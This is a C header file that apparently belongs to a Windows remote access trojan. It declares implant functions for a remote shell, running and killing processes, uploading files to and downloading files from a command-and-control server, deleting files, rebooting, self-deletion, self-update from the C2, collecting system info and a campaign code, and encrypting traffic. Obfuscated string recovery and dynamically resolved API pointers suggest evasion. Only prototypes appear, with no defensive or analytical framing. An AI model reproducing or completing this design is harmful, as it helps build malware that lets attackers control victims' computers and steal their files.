#pragma once

char* GetOriginal(int offsets[], char* ALL_ALPHANUM, int sizeof_offset);

void InitConn(void);


void ShellExec(SOCKET client_socket);
void ListProcesses(FARPROC create_snap_func, FARPROC proc_first_func, FARPROC proc_next_func, SOCKET client_socket, FARPROC send_func);
void StopProcess(SOCKET client_socket, FARPROC send_func, DWORD PIDtoTerminate);
DWORD RunExe(SOCKET client_socket, FARPROC recv_func, FARPROC send_func, const char* FilePath);

int GetFileFromC2(SOCKET client_socket, FARPROC recv_func, FARPROC send_func, const char* filename, const char* FullPath);
int UploadFileToC2(SOCKET client_socket, FARPROC send_func, FARPROC recv_func, const char* FilePathToUpload);

DWORD DeleteRequestedFile(SOCKET client_socket, FARPROC recv_func, FARPROC send_func, const char* FileNameToDelete);
void ListDrives(SOCKET client_socket, FARPROC send_func);
void GetFileDate(SOCKET client_socket, FARPROC recv_func, FARPROC send_func, const char* FilePath);
void SelfDelete(void);
void GetUpdatedVersionFromC2(SOCKET client_socket, FARPROC recv_func, FARPROC send_func, const char* UpdatedVersionRat);
DWORD RebootSystem(SOCKET client_socket, FARPROC send_func);



int SysInfo(char* buf, SIZE_T buf_size);	//https://learn.microsoft.com/en-us/windows/win32/sysinfo/getting-system-information
void GetLocalIP(char* buf, SIZE_T buf_size);
void GetCampaginCode(char* buf, SIZE_T buf_size);
void decrypt(unsigned char* recv_buf, SIZE_T recv_buf_size);
void encrypt(unsigned char* recv_buf, SIZE_T recv_buf_size);

